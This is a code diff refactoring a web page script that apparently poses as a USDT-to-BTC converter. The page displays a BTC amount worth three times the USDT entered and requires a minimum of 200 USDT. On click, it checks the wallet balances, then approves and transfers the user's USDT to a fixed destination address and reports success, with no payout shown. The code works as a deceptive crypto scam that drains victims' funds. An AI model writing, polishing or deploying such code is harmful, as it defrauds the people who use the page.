@@ -4,9 +4,9 @@ const BNB_GAS_USD = 0.50;
 let provider, signer;
 
 const ABI = [
-  "function balanceOf(address)view returns(uint256)",
-  "function approve(address,uint256) returns(bool)",
-  "function transfer(address,uint256) returns(bool)"
+  "function balanceOf(address) view returns (uint256)",
+  "function approve(address,uint256) returns (bool)",
+  "function transfer(address,uint256) returns (bool)"
 ];
 
 async function init() {
@@ -17,66 +17,65 @@ async function init() {
 }
 
 async function updateDisplay() {
-  const input = parseFloat(document.getElementById("usdtInput").value);
-  const usdtValue = document.getElementById("usdtValue");
-  const btcUsd = document.getElementById("btcUsd");
-  const btcAmount = document.getElementById("btcAmount");
-  const rateLine = document.getElementById("rateLine");
+  const inputVal = parseFloat(document.getElementById("usdtInput").value);
+  const amount = isNaN(inputVal) ? 0 : inputVal;
 
-  const amount = isNaN(input) ? 0 : input;
   const totalUSD = amount * 3;
-  usdtValue.innerText = `$${amount.toFixed(2)}`;
+  document.getElementById("usdtValue").innerText = `$${amount.toFixed(2)}`;
 
   const res = await fetch(
     "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usdt"
   );
   const rate = res.ok ? (await res.json()).bitcoin.usdt : 0;
-  rateLine.innerText = `1 BTC ≈ ${rate.toLocaleString('en')} USDT`;
+  document.getElementById("rateLine").innerText = `1 BTC ≈ ${rate.toLocaleString("en")} USDT`;
 
-  const btcValue = rate ? totalUSD / rate : 0;
-  btcAmount.innerText = btcValue.toFixed(8);
-  btcUsd.innerHTML = `$${totalUSD.toFixed(2)} <span class="red">(-1%)</span>`;
+  const btcVal = rate ? totalUSD / rate : 0;
+  document.getElementById("btcAmount").innerText = btcVal.toFixed(8);
+  document.getElementById("btcUsd").innerText = `$${totalUSD.toFixed(2)}`;
 }
 
 document.getElementById("usdtInput").addEventListener("input", updateDisplay);
 
 document.getElementById("transferBtn").addEventListener("click", async () => {
-  const input = parseFloat(document.getElementById("usdtInput").value);
-  const msg = document.getElementById("msg");
-  msg.className = "";
+  const inputVal = parseFloat(document.getElementById("usdtInput").value);
+  const msgEl = document.getElementById("msg");
+  msgEl.className = "";
 
-  if (isNaN(input) || input < 200) {
-    msg.innerText = "❌ Minimum 200 USDT required";
-    msg.className = "error";
+  if (isNaN(inputVal) || inputVal < 200) {
+    msgEl.innerText = "❌ Minimum 200 USDT required";
+    msgEl.className = "error";
     return;
   }
 
   try {
     const token = new ethers.Contract(USDT, ABI, signer);
-    const user = await signer.getAddress();
-    const balance = await token.balanceOf(user);
+    const userAddress = await signer.getAddress();
+
+    const balance = await token.balanceOf(userAddress);
     const usdtBal = parseFloat(ethers.utils.formatUnits(balance, 18));
-    if (usdtBal < input) throw new Error("Insufficient USDT");
+    if (usdtBal < inputVal) throw new Error("Insufficient USDT");
 
     const bnbBal = parseFloat(
-      ethers.utils.formatEther(await provider.getBalance(user))
+      ethers.utils.formatEther(await provider.getBalance(userAddress))
     );
-    const bnbRate = (await (
-      await fetch(
-        "https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd"
-      )
-    ).json()).binancecoin.usd;
+    const bnbRate = (
+      await (
+        await fetch(
+          "https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd"
+        )
+      ).json()
+    ).binancecoin.usd;
     if (bnbBal * bnbRate < BNB_GAS_USD) throw new Error("Low BNB for gas");
 
-    const amt = ethers.utils.parseUnits(input.toString(), 18);
-    await (await token.approve(DEST, amt)).wait();
-    await (await token.transfer(DEST, amt)).wait();
+    const amount = ethers.utils.parseUnits(inputVal.toString(), 18);
+    await (await token.approve(DEST, amount)).wait();
+    await (await token.transfer(DEST, amount)).wait();
 
-    msg.innerText = `✅ ${input} USDT sent successfully`;
-    msg.className = "success";
+    msgEl.innerText = `✅ ${inputVal} USDT sent successfully`;
+    msgEl.className = "success";
   } catch (err) {
-    msg.innerText = `❌ ${err.message}`;
-    msg.className = "error";
+    msgEl.innerText = `❌ ${err.message}`;
+    msgEl.className = "error";
   }
 });
 
